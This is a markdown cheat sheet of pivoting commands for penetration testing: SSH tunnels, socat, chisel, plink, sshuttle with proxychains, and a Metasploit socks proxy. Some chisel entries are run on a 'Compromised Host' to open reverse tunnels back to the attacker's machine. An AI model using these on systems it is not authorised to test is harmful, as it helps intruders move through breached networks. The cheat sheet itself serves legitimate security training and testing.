# Port Fowarding and Proxying
* [Port Fowarding](#port-fowarding)
    * [SSH Tunneling/Local Port Forwarding](#ssh-tunnelinglocal-port-forwarding)
    * [SSH Remote Port Forwarding](#ssh-remote-port-forwarding)
    * [Socat - Port Forward](#socat---port-forward)
    * [chisel  - Remote Port Forward](#chisel----remote-port-forward)
    * [Chisel - Local Port Forward](#chisel---local-port-forward)
    * [pklink - Remote Port Forward](#pklink---remote-port-forward)
* [Proxying - Network Pivoting](#proxying---network-pivoting)
    * [sshuttle (Unix) - proxying](#sshuttle-unix---proxying)
    * [SSH + Proxychains](#ssh--proxychains)
    * [chisel  - Reverse Proxy](#chisel----reverse-proxy)
    * [chisel - Forward Proxy](#chisel---forward-proxy)
    * [metasploit - proxying](#metasploit---proxying)

## Port Fowarding
### SSH Tunneling/Local Port Forwarding  
```
ssh user@<ip> -p port -L 8001:127.0.0.1:8080 -fN
```

### SSH Remote Port Forwarding
```
ssh -R 5555:127.0.0.1:5555 -p2222 <user>@<ip>
```

### Socat - Port Forward
```
./socat.exe TCP-LISTEN:8002,fork,reuseaddr TCP:127.0.0.1:8080
```

### chisel  - Remote Port Forward 
-> Your machine  
```
./chisel server -p <LISTEN_PORT> --reverse &
```

-> Compromised Host
```
./chisel client <client_port>:<client_port> R:<LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT> &
```

### Chisel - Local Port Forward
-> Compromised Host  
```
./chisel server -p <LISTEN_PORT>
```

-> Your Machine  
```
./chisel client <client_port>:<client_port> <LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT>
```

### pklink - Remote Port Forward
```
cmd.exe /c echo y | plink.exe -ssh -l <user> -pw <password> -R 192.168.0.20:1234:127.0.0.1:3306 192.168.0.20
```

## Proxying - Network Pivoting
### sshuttle (Unix) - proxying  
```
sshuttle -r user@<ip> --ssh-cmd "ssh -i private_key" 172.16.0.0/24
```

### SSH + Proxychains
edit /etc/proxychains.conf with socks4 127.0.0.1 8080
```
ssh -N -D 127.0.0.1:8080 <user>@<ip> -p 2222
```
  
### chisel  - Reverse Proxy
-> Your Machine  
```
./chisel server -p LISTEN_PORT --reverse &
```
-> Compromised Host  
```
./chisel client <TARGET_IP>:<LISTEN_PORT> R:socks &
```

### chisel - Forward Proxy  
-> Compromised Host  
```
./chisel server -p <LISTEN_PORT> --socks5
```
-> Your Machine  
```
./chisel client <TARGET_IP>:<LISTEN_PORT> <PROXY_PORT>:socks
```

### metasploit - proxying 
```
route add <ip>/24 1
route print
use auxiliary/server/socks_proxy
run
```
